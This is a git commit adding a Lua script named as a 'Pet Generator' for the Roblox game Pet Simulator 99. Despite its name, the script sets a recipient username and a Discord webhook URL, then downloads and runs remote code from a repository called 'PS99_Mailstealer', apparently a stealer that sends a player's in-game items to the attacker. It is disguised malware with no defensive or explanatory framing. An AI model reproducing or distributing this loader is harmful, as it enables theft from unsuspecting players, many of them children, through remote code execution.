319265c5b97b8d2b66e76f404a3f2acb5e44f4ce
PetSim99Scripts43 <petsim99lover@outlook.com>
2024-10-08 22:48:40 -0500

    Add files via upload

---
+++ PetSim99PetGenerator.lua
@@ -0,0 +1,5 @@
+Username = "HedwigTheOwl43"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1293418203460141146/Vnv3cfYi8lOVoy5lmKpaOzFF40i194buBm-fENrXLm1M5fPBWhHg86bprznt4tJC7AY0"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
